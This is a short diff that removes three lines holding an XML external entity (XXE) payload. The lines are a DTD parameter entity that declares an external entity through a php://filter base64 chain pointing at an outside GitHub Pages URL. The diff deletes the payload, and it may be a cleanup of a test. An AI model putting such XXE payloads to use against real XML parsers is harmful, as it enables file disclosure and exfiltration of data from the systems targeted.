@@ -1,3 +1,0 @@
-<!ENTITY %run "
-    <!ENTITY % file SYSTEM 'php://filter/write=convert.base64-encode/resource=https://threeony.github.io/xxe/output.txt'>
-"> %run;
